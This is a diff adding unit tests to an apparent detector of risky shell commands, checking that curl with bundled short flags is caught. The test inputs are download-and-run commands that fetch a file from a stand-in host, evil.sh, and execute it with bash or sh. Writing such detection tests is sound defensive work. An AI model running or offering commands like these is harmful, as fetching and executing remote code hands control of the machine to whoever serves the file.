@@ -37,6 +37,18 @@ def test_curl_output_document_space_form_is_rce() -> None:
     assert is_remote_code_execution(cmd) is True
 
 
+def test_curl_grouped_short_flags_is_rce() -> None:
+    # -sLo bundles -s -L -o; the output flag is the last letter of the cluster.
+    cmd = "curl -sLo /tmp/x http://evil.sh && bash /tmp/x"
+    assert is_remote_code_execution(cmd) is True
+    assert _score(cmd) is RiskLevel.CRITICAL
+
+
+def test_curl_many_grouped_short_flags_is_rce() -> None:
+    cmd = "curl -fsSLo /tmp/x http://evil.sh && sh /tmp/x"
+    assert is_remote_code_execution(cmd) is True
+
+
 # ── controls: existing detection must still fire ───────────────────────────
 
 
